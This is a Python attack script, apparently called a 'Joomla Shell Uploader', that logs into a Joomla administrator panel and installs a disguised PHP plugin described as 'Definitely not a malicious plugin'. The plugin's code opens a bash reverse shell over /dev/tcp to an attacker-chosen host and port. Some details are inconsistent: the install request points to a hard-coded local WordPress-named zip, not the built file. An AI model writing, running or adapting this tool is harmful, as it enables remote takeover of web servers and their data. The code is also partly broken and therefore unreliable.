import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning

from bs4 import BeautifulSoup

import string

import sys

import zipfile

import os

import random




def cls():
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])
def print_logo():
        print ("""------------------------------------------------""")
        print ("""	  Joomla Shell Uploader """)
        print ("""------------------------------------------------""")

cls()
print_logo()

# Disable ssl warning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  



url = input("Enter Joomla target url: ")
username = input("Enter Joomla Username: ")   
password = input("Enter Joomla Password: ")
host = input("Enter Attacker Host: ")
port = input("Enter Attacker Port: ")
k = input("Disable SSL/TLS Check? (y/n): ")
if k == 'y':
    k = False
else:
    k = True
    

class JoomlaMaliciousPluginUploader:

    def __init__(self, joomla_link, username, password, ip, port, ssl_verify):

        if joomla_link[-1] == '/':
            joomla_link = joomla_link[:-1]

        self.joomla_link = joomla_link   

        self.username = username  

        self.password = password   

        self.ip = ip

        self.port = port 
        
        self.ssl_verify = ssl_verify  

        self.joomla_login = f'{self.joomla_link}/administrator/index.php'

        self.plugin_upload_link = f'{self.joomla_link}/administrator/index.php?option=com_installer&view=install'

        self.session = requests.session()

        self.session.headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Edg/86.0.622.61'}



    def make_malicious_plugin(self):
        tmp_php_filename = 'code.php'
        plugin_zip_filename = 'joomla_malicious_plugin.zip'
        print('Making the malicious plugin...')
        random_string = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
        php_code = f'''<?php
                /**

                * Plugin Name: Cute plugin {random_string}

                * Plugin URI: https://127.0.0.1:31337/pwn.php?cmd=whomai

                * Description: Definitely not a malicious plugin.

                */

                system("bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1");

                ?>'''

        with open(tmp_php_filename, 'w') as f:
            f.write(php_code)

        with zipfile.ZipFile(plugin_zip_filename, mode='w') as z:
            z.write(tmp_php_filename)

        return plugin_zip_filename



    def login(self):

        print('Logging In...')

        data = {

            'username': self.username, 

            'passwd': self.password,

            'lang': 'en-GB', 

            'option': 'com_login', 

            'task': 'login', 

            'return': 'aW5kZXgucGhw'

        }

        try:
            req = self.session.get(self.joomla_login, verify=self.ssl_verify)
        except requests.exceptions.SSLError:
            print('SSL Error you may use "-k" to disable the SSL/TLS checks')
            sys.exit(1)

        login_req = self.session.post(self.joomla_login, data=data, verify=self.ssl_verify)

        if "<title>Home Dashboard - My site - Administration</title>" in login_req.text:
            print('Logged In Successfully')
            return True
        else:
            print('Login failed username or password is incorrect')
            return



    def upload_and_active(self, plugin_zip_file):

        # Uploading the plugin
        print('Uploading The malicious plugin...')

        install_page = self.session.get(self.plugin_upload_link, verify=self.ssl_verify)

        soup = BeautifulSoup(install_page.content, features="html.parser")

        form = soup.find('form', {'name': 'adminForm'})
        _token = form.find('input', {'name': 'token'})['value']


        data = {

            "installtype": "url",
            "install_url": "https://127.0.0.1/wp_malicious_plugin.zip", 
            "token": _token, 
            "task": "install.install"

        }

        upload_req = self.session.post(self.plugin_upload_link, data=data, verify=self.ssl_verify)

        print('Activating it...')
        print('Done you should have a shell now')



    def main(self):
        login_status = self.login()
        if not login_status:
            sys.exit()
        plugin_zip_file = self.make_malicious_plugin()

        self.upload_and_active(plugin_zip_file)

        self.session.close()
        os.remove('joomla_malicious_plugin.zip')
        os.remove('code.php')



program = JoomlaMaliciousPluginUploader(url, username, password, host, port, k)
program.main()